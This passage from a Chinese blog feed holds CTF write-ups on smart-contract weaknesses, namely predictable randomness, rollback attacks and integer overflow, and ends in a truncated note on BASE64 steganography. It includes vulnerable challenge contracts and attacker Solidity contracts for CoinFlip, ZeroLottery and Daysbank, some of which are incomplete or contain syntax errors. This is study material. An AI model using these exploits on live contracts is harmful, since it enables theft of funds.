    <content type="html"><![CDATA[<h4 id="使用私有变量的伪随机数"><a href="#使用私有变量的伪随机数" class="headerlink" title="使用私有变量的伪随机数"></a>使用私有变量的伪随机数</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>合约使用外界未知的私有变量参与随机数生成。无法通过另一合约访问，但是变量储存进 storage 之后仍然是公开的。我们可以使用区块链浏览器（如 etherscan）观察 storage 变动情况，或者计算变量储存的位置并使用 Web3 的 api 获得私有变量值，然后计算得到随机数。</p><h4 id="外部参与的随机数"><a href="#外部参与的随机数" class="headerlink" title="外部参与的随机数"></a>外部参与的随机数</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>随机数由其他服务端生成。为了确保公平，服务端会先将随机数或者其种子的哈希写入合约中，然后待用户操作之后再公布哈希对应的明文值。由于明文空间有 256 位，这样的随机数生成方法相对安全。但是在明文揭露时，我们可以在状态为 pending 的交易中找到明文数据，并以更高的 gas 抢在之前完成交易确认。</p><h4 id="使用区块变量的伪随机数"><a href="#使用区块变量的伪随机数" class="headerlink" title="使用区块变量的伪随机数"></a>使用区块变量的伪随机数</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p>EVM 有五个字节码可以获取当前区块的变量，包括 coinbase、timestamp、number、difficulty、gaslimit。</p><p>我们也可以编写攻击合约，在攻击合约中获取到相同的区块变量值，进一步用相同的算法得到随机数值。</p><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.18;<br><br>import &#x27;openzeppelin-solidity/contracts/math/SafeMath.sol&#x27;;<br><br>contract CoinFlip &#123;<br><br>  using SafeMath for uint256;<br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  function CoinFlip() public &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue.div(FACTOR);<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>代码处理流程为：<ul><li>获得上一块的 hash 值（    uint256 blockValue &#x3D; uint256(block.blockhash(block.number.sub(1)));）</li><li>判断与之前保存的 hash 值是否相等，相等则会退（if (lastHash &#x3D;&#x3D; blockValue) {revert();}）</li><li>根据 blockValue&#x2F;FACTOR 的值判断为正或负，即通过 hash 的首位判断（bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;）</li></ul></li></ul><p>如果使用可以被挖矿的矿工所控制的变量，如区块哈希值，时间戳，区块高低或是 Gas 上限等作为随机数的熵源，产生的随机数并不安全。</p><p>所以Attack</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.18;<br>contract CoinFlip &#123;<br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  function CoinFlip() public &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(block.blockhash(block.number-1));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br>contract Hack&#123;<br>uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br>address instance=add;<br>CoinFlip c=CoinFlip(instance);<br>function attack()&#123;<br>    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));<br>    uint256 coinFlip = blockValue.div(FACTOR);<br>    bool side = coinFlip == 1 ? true : false;<br>    <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用10次 attack() 即可。</p><h4 id="使用-Blockhash-的伪随机数"><a href="#使用-Blockhash-的伪随机数" class="headerlink" title="使用 Blockhash 的伪随机数"></a>使用 Blockhash 的伪随机数</h4><h5 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h5><p>Blockhash 是一个特殊的区块变量，EVM 只能获取到当前区块之前的 256 个区块的 blockhash （<strong>不含当前区块</strong>），对于这 256 个之外的区块返回 0。使用 blockhash 可能存在几种问题。</p><ol><li>误用，如 <code>block.blockhash(block.number)</code> 恒为零。</li><li>使用过去区块的有效 blockhash ，可以编写攻击合约获取相同值。</li><li>将猜数字和开奖的交易分开在两个不同区块中，并且使用猜数字时还不知道的某个区块的 blockhash 作为熵源，则可以等待 256 个区块后再进行开奖，消除 blockhash 的不确定性。</li></ol><h4 id="回滚攻击"><a href="#回滚攻击" class="headerlink" title="回滚攻击"></a>回滚攻击</h4><h5 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h5><p>在某些情况下，获取随机数可能过于困难或繁琐，这时可以考虑使用回滚攻击。回滚攻击的思想很简单：完全碰运气，输了就 “耍赖”，通过抛出异常使整个交易回滚不作数；赢的时候则不作处理，让交易被正常确认。</p><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>0ctf final 2018 : ZeroLottery</p><p>Your goal is make your ZeroLottery’s balance &gt; 500. After that, you can get the flag at <a href="http://192.168.201.18:5000/flag?wallet=">http://192.168.201.18:5000/flag?wallet=</a> page.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br>contract ZeroLottery &#123;<br>    struct SeedComponents &#123;<br>        uint component1;<br>        uint component2;<br>        uint component3;<br>        uint component4;<br>    &#125;<br><br>    uint private base = 8;<br><br>    address private owner;<br>    mapping (address =&gt; uint256) public balanceOf;<br><br>    function ZeroLottery() public &#123;<br>        owner = msg.sender;<br>    &#125;<br>    <br>    function init() public payable &#123;<br>        balanceOf[msg.sender] = 100;<br>    &#125;<br><br>    function seed(SeedComponents components) internal pure returns (uint) &#123;<br>        uint secretSeed = uint256(keccak256(<br>            components.component1,<br>            components.component2,<br>            components.component3,<br>            components.component4<br>        ));<br>        return secretSeed;<br>    &#125;<br>    <br>    function bet(uint guess) public payable &#123;<br>        require(msg.value&gt;1 ether);<br>        require(balanceOf[msg.sender] &gt; 0);<br>        uint secretSeed = seed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));<br>        uint n = uint(keccak256(uint(msg.sender), secretSeed)) % base;<br><br>        if (guess != n) &#123;<br>            balanceOf[msg.sender] = 0;<br>            // charge 0.5 ether for failure<br>            msg.sender.transfer(msg.value - 0.5 ether);<br>            return;<br>        &#125;<br>        // charge 1 ether for success<br>        msg.sender.transfer(msg.value - 1 ether);<br>        balanceOf[msg.sender] = balanceOf[msg.sender] + 100;<br>    &#125;<br><br>    function paolu() public payable &#123;<br>        require(msg.sender == owner);<br>        selfdestruct(owner);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>分析：</p><p>ZeroLottery()  定义owner；</p><p>init() 初始化余额为100；</p><p>seed() 定义生成随机数函数；</p><p>bet() 进行下注，猜对了扣除0.5，余额清零；猜对了扣除1 ether，余额加上100；</p><p>paolu() 用来销毁合约，只能合约的拥有者能调用；</p><p>本题的目标是余额为500代币。</p><h6 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h6><p>伪随机数攻击</p><p>block.coinbase, block.difficulty, block.gaslimit, block.timestamp来产生seed，因此区块变量是可以在本地计算出来的。</p><p>由于进行转账操作需要在攻击合约设置fallback函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br>contract Attack &#123;<br>    uint private base = 8;<br>    address owner;<br>    address targetAddr = 0xadd;<br>    constructor() payable&#123;<br>        owner=msg.sender;<br>        targetAddr.call(bytes4(keccak256(&quot;init()&quot;)));<br>    &#125;//传6eth<br>    function() payable external&#123;<br>        <br>    &#125;<br>    <br>    function hack() public &#123;<br>        uint secretSeed = uint256(keccak256(<br>            (uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp<br>        ));<br>        uint n = uint(keccak256(uint(this), secretSeed)) % base;<br>        <br>        targetAddr.call.value(1.2 ether)(bytes4(keccak256(&quot;bet(uint256)&quot;)),n);<br>    &#125;<br>    function paolu() public payable &#123;<br>        selfdestruct(owner);<br>    &#125;<br>    function init() public &#123;<br>        targetAddr.call(bytes4(keccak256(&quot;init()&quot;)));<br>    &#125;<br>    <br>&#125;<br><br></code></pre></td></tr></table></figure><p>如果要求传的钱&gt;1 ether，而且猜完最多会退1ether，因此相当于一定会退钱回我们的攻击合约，攻击五次即可。</p><h6 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h6><p>回滚攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function guess() public &#123;<br>    task.bet.value(2 ether)(1);<br>&#125;<br>function () public payable &#123;<br>    require(msg.value != 1.5 ether);<br>&#125;<br>//既然想要猜对，那么fallback函数必须要收到1.5ETH，我们可以设定一个固定的数进行尝试。<br></code></pre></td></tr></table></figure><p>同样可以利用循环：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract Attack &#123;<br>    address addr = 0x21106c363469FA680115096c2Ae757B4586C2a75;<br>    address owner;<br>    constructor() payable &#123;<br>        owner = msg.sender;<br>        addr.call(bytes4(keccak256(&quot;init()&quot;)));<br>    &#125;<br>    function() payable external &#123;<br>        require(msg.value ==0.2 ether );<br>    &#125;<br>    function hack()&#123;<br>       for(uint conut=0;count&lt;5;count++)&#123;<br>           for(uint n=0;n&lt;8;n++)&#123;<br>                addr.call.value(1.2 ether (bytes4(keccak256(&quot;bet(uint256)&quot;)),n); <br>            &#125;<br>        &#125;<br>    &#125;<br>    function kill() public &#123;<br>        require(owner==msg.sender);<br>        selfdestruct(owner);<br>    &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>既然是失败是扣0.5，成功扣1eth，那么如果回退的钱数与失败的一样，那么就抛出异常。</p>]]></content>
    
    
    <categories>
      
      <category>Blockchain</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Integer Overflow and Underflow</title>
    <link href="/2023/10/21/Integer-Overflow-and-Underflow/"/>
    <url>/2023/10/21/Integer-Overflow-and-Underflow/</url>
    
    <content type="html"><![CDATA[<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>EVM的整数有int和uint两种。</p><p>在 <code>Solidity</code> 语言中,变量支持的整数类型步长是以8递增的,从 <code>uint8</code> 到 <code>uint256</code>, <code>uint</code> 默认是 <code>uint256</code>,以 <code>uin8</code> 为例</p><p>我们知道 <code>uint8</code> 是8位,我们最多可以 <code>2**8-1</code>,也就是 255,若是256则会造成溢出,这是上溢</p><p>下溢也是一样的, <code>uint(0)-1</code> 就是255</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>Capture The Ether 的 Token sale</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract TokenSaleChallenge &#123;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    uint256 constant PRICE_PER_TOKEN = 1 ether;<br><br>    function TokenSaleChallenge(address _player) public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance &lt; 1 ether;<br>    &#125;<br><br>    function buy(uint256 numTokens) public payable &#123;<br>        require(msg.value == numTokens * PRICE_PER_TOKEN);<br><br>        balanceOf[msg.sender] += numTokens;<br>    &#125;<br><br>    function sell(uint256 numTokens) public &#123;<br>        require(balanceOf[msg.sender] &gt;= numTokens);<br><br>        balanceOf[msg.sender] -= numTokens;<br>        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：<br>首先规定了合约中有1 ether，一个代币需要支付1 ether. 而isComplete()要求余额小于1 ether。 </p><p> buy(uint256 numTokens)函数则是msg.value &#x3D;&#x3D; numTokens * PRICE_PER_TOKEN。</p><p>再EVM里1ether&#x3D;10* *8 wei。然而EVM虚拟机最大只有256位即    2**256-1.因此只要我们的numTokens是一个很大的值，就会溢出。即我们花费不足1etner就买到了大量的代币，将一些代币卖出即可完成题目要求。</p><p>因此，我们可以购买2*<em>256&#x2F;&#x2F;10</em> *18+1 个代币就可以完成题目要求。</p><p>整数下溢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Bank &#123;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    ...<br>    function withdraw(uint256 amount) public &#123;<br>        require(balanceOf[msg.sender] - amount &gt;= 0);<br>        balanceOf[msg.sender] -= amount;<br>        msg.sender.send.value(amount)();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：</p><p>由于uint为无符号类型，因此</p><p>balanceOf[msg.sender] - amount &gt;&#x3D; 0看似没有任何问题，但是由于都是无符号类型，因此结果永远大于等于0的。所以我们可以任意取款。应改为balanceOf[msg.sender] &gt;&#x3D;amount</p><p>还有一种情况，与重入攻击有关：将1的物品卖出两次导致下溢为巨大的正数。</p><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><h5 id="【ciscn2019】-Daysbank"><a href="#【ciscn2019】-Daysbank" class="headerlink" title="【ciscn2019】 Daysbank"></a>【ciscn2019】 Daysbank</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.24;<br><br>contract DaysBank &#123;<br>    mapping(address =&gt; uint) public balanceOf;<br>    mapping(address =&gt; uint) public gift;<br>    address owner;<br>        <br>    constructor()public&#123;<br>        owner = msg.sender;<br>    &#125;<br>    <br>    event SendFlag(uint256 flagnum, string b64email);<br>    function payforflag(string b64email) public &#123;<br>        require(balanceOf[msg.sender] &gt;= 10000);<br>        emit SendFlag(1,b64email);<br>    &#125;<br><br>    function getgift() public&#123;<br>        require(gift[msg.sender]==0);<br>        balanceOf[msg.sender]+=1;<br>        gift[msg.sender]=1;<br>    &#125;<br>    <br>    function transfer(address towhere, uint howmuch) public &#123;<br>        require(howmuch&gt;1);<br>        require(balanceOf[msg.sender]&gt;1);<br>        require(balanceOf[msg.sender]&gt;=howmuch);<br>        balanceOf[msg.sender]-=howmuch;<br>        balanceOf[towhere]+=howmuch;<br>    &#125;<br>    <br>    function profit() public&#123;<br>        require(balanceOf[msg.sender]==1);<br>        require(gift[msg.sender]==1);<br>        balanceOf[msg.sender]+=1;<br>        gift[msg.sender]=2;<br>    &#125;<br>    <br>    function transfer2(address towhere, uint howmuch) public &#123;<br>        require(howmuch&gt;2);<br>        require(balanceOf[msg.sender]&gt;2);<br>        require(balanceOf[msg.sender]-howmuch&gt;0);<br>        balanceOf[msg.sender]-=howmuch;<br>        balanceOf[towhere]+=howmuch;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：</p><p>找到flag的函数payforflag（），观察得到，要想得到flag需要balanceof大于10w。</p><p>而transfer2（）函数中balanceOf[msg.sender]-howmuch&gt;0存在整数下溢的漏洞，因而可以利用。但是需要满足balanceOf[msg.sender]&gt;2的要求。</p><p>我们可以通过getgift()来获得一个代币，然后可以满足profit（）的要求，从而获得两个代币 ，此时balanceOf为2，gift为1。如果要达到balanceOf[msg.sender]&gt;2，那么需要利用transfer（）函数才能达到要求，transfer没有下溢的漏洞。</p><p>攻击过程：<br>先利用账号a，通过getgift()，然后利用profit（）函数，此时余额为2，gift为1.</p><p>然后再用账号b，重复该操作。</p><p>再将账号a利用transfer函数转给账号b两个代币。</p><p>然后再利用账号b调用transfer2转给账号a一个非常大的金额，达到溢出的效果，此时两个地址都可以执行flag函数。</p>]]></content>
    
    
    <categories>
      
      <category>Blockchain</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BASE64</title>
    <link href="/2023/10/20/BASE64/"/>
    <url>/2023/10/20/BASE64/</url>
    
    <content type="html"><![CDATA[<p>BASE64</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">ZG</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">YY</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">aW</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">ZF</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">cm</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">aM</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">b2</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">dc</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">c2</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">Zf</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>解码得到 daidrhouse，然而编码得到</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">ZA</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">YQ</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">aQ</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">ZA</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">cg</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">aA</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">bw</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">dQ</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">cw</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">ZQ</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>发现每一串的第二位都发生了改变，但是结果没变。</p><h4 id="base64原理"><a href="#base64原理" class="headerlink" title="base64原理"></a>base64原理</h4><p>顾名思义，base64编码就是用64个ascii字符作为基础来编码二进制内容的一种编码方式。相信各位一定在网页中看到过base64编码的内嵌图片，甚至QQ音乐传输歌词文件时，也采用了base64编码。将二进制编码为ascii字符，使数据在某些场景下更便于阅读、便于传输。当然，将所有二进制「浓缩」到区区64个字符来表示，一定会在体积上作出妥协。字符在编码完成后，会增大1&#x2F;3倍。</p><p>由于只用到了<strong>64个字符</strong>，所以使用6个二进制位(2^6 &#x3D; 64)完全可以把所有的字符表示出来，于是原来的1个字节8位在base64编码中变成了1个字节6位。</p><p>换言之：把原本的3个字节变成现在的4个字节，因为(<code>3*8 == 4*6</code>)</p><h4 id="索引表"><a href="#索引表" class="headerlink" title="索引表"></a>索引表</h4><p>base64有一张标准编码表，为64个ascii字符排序并赋予索引。</p><table><thead><tr><th align="left">索引</th><th align="left">字符</th><th align="left">索引</th><th align="left">字符</th><th align="left">索引</th><th align="left">字符</th><th align="left">索引</th><th align="left">字符</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">A</td><td align="left">16</td><td align="left">Q</td><td align="left">32</td><td align="left">g</td><td align="left">48</td><td align="left">w</td></tr><tr><td align="left">1</td><td align="left">B</td><td align="left">17</td><td align="left">R</td><td align="left">33</td><td align="left">h</td><td align="left">49</td><td align="left">x</td></tr><tr><td align="left">2</td><td align="left">C</td><td align="left">18</td><td align="left">S</td><td align="left">34</td><td align="left">i</td><td align="left">50</td><td align="left">y</td></tr><tr><td align="left">3</td><td align="left">D</td><td align="left">19</td><td align="left">T</td><td align="left">35</td><td align="left">j</td><td align="left">51</td><td align="left">z</td></tr><tr><td align="left">4</td><td align="left">E</td><td align="left">20</td><td align="left">U</td><td align="left">36</td><td align="left">k</td><td align="left">52</td><td align="left">0</td></tr><tr><td align="left">5</td><td align="left">F</td><td align="left">21</td><td align="left">V</td><td align="left">37</td><td align="left">l</td><td align="left">53</td><td align="left">1</td></tr><tr><td align="left">6</td><td align="left">G</td><td align="left">22</td><td align="left">W</td><td align="left">38</td><td align="left">m</td><td align="left">54</td><td align="left">2</td></tr><tr><td align="left">7</td><td align="left">H</td><td align="left">23</td><td align="left">X</td><td align="left">39</td><td align="left">n</td><td align="left">55</td><td align="left">3</td></tr><tr><td align="left">8</td><td align="left">I</td><td align="left">24</td><td align="left">Y</td><td align="left">40</td><td align="left">o</td><td align="left">56</td><td align="left">4</td></tr><tr><td align="left">9</td><td align="left">J</td><td align="left">25</td><td align="left">Z</td><td align="left">41</td><td align="left">p</td><td align="left">57</td><td align="left">5</td></tr><tr><td align="left">10</td><td align="left">K</td><td align="left">26</td><td align="left">a</td><td align="left">42</td><td align="left">q</td><td align="left">58</td><td align="left">6</td></tr><tr><td align="left">11</td><td align="left">L</td><td align="left">27</td><td align="left">b</td><td align="left">43</td><td align="left">r</td><td align="left">59</td><td align="left">7</td></tr><tr><td align="left">12</td><td align="left">M</td><td align="left">28</td><td align="left">c</td><td align="left">44</td><td align="left">s</td><td align="left">60</td><td align="left">8</td></tr><tr><td align="left">13</td><td align="left">N</td><td align="left">29</td><td align="left">d</td><td align="left">45</td><td align="left">t</td><td align="left">61</td><td align="left">9</td></tr><tr><td align="left">14</td><td align="left">O</td><td align="left">30</td><td align="left">e</td><td align="left">46</td><td align="left">u</td><td align="left">62</td><td align="left">+</td></tr><tr><td align="left">15</td><td align="left">P</td><td align="left">31</td><td align="left">f</td><td align="left">47</td><td align="left">v</td><td align="left">63</td><td align="left">&#x2F;</td></tr></tbody></table><p>有时为了防止混淆（比如链接），会使用 <code>.</code> <code>_</code> 来代替索引表中的 <code>+</code> <code>/</code> 。</p><h4 id="隐写原理"><a href="#隐写原理" class="headerlink" title="隐写原理"></a>隐写原理</h4><p>base64在解码的时候，会按照字符串末尾的 <code>=</code> 数量来删除相应字节数。或许你已经发现了，当一组字符的数量为1字节或2字节的时候，会有4位或2位二进制在解码时被忽略</p><p><img src="/../images/NK23ZzryPj9YBpi-16977914930905.png" 